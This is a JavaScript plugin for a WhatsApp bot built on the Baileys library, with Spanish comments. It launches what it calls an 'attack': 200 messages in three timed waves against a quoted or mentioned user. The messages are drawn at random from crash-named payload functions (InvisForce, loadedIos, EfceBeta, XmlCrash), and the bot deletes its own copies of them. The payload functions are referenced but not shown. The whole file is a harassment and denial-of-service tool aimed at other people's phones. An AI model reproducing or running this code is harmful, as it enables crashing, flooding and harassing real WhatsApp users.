import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn }) => {
  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
  const bot = conn.user.id;

  // Solo lo puede usar el bot
  if (m.sender !== bot) return;

  await conn.sendMessage(m.chat, { text: '🧨 Ataque iniciado. Se enviarán 200 mensajes en 15 minutos.' }, { quoted: m });

  // ATAQUE 1
  for (let round = 0; round < 10; round++) {
    setTimeout(() => {
      enviarTanda(conn, jid, round + 1, m, '1');
    }, round * 30000);
  }

  // ATAQUE 2 (a los 5 minutos)
  setTimeout(() => {
    for (let round = 0; round < 10; round++) {
      setTimeout(() => {
        enviarTanda(conn, jid, round + 1, m, '2');
      }, round * 30000);
    }
  }, 5 * 60 * 1000);

  // ATAQUE 3 (a los 10 minutos)
  setTimeout(() => {
    for (let round = 0; round < 10; round++) {
      setTimeout(() => {
        enviarTanda(conn, jid, round + 1, m, '3');
      }, round * 30000);
    }

    setTimeout(() => {
      conn.sendMessage(m.chat, { text: '🎯 Ataque finalizado. 200 mensajes enviados en total.' }, { quoted: m });
    }, 5 * 60 * 1000);
  }, 10 * 60 * 1000);
};

handler.command = /^(buenas|force-beta)$/i;
export default handler;

// Utilidad
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Core: ejecutar una tanda de 20
async function enviarTanda(conn, jid, num, m, ciclo) {
  const funciones = {
    InvisForce,
    loadedIos,
    EfceBeta,
    XmlCrash,
  };

  try {
    console.log(`▶️ Ejecutando tanda ${num}/10 del ataque ${ciclo}`);

    for (let i = 0; i < 20; i++) {
      const keys = Object.keys(funciones);
      const aleatoria = funciones[keys[Math.floor(Math.random() * keys.length)]];
      const msg = await aleatoria(conn, jid);

      if (msg?.key?.id) {
        await conn.sendMessage(conn.user.id, { delete: msg.key });
      }

      await delay(1000);
    }

    await conn.sendMessage(m.chat, {
      text: `✅ Tanda ${num}/10 del ataque ${ciclo} enviada.`,
    }, { quoted: m });

  } catch (e) {
    console.error("❌ Error en tanda:", e);
    await conn.sendMessage(m.chat, {
      text: "❌ Error en tanda:\n" + e.message,
    }, { quoted: m });
  }
}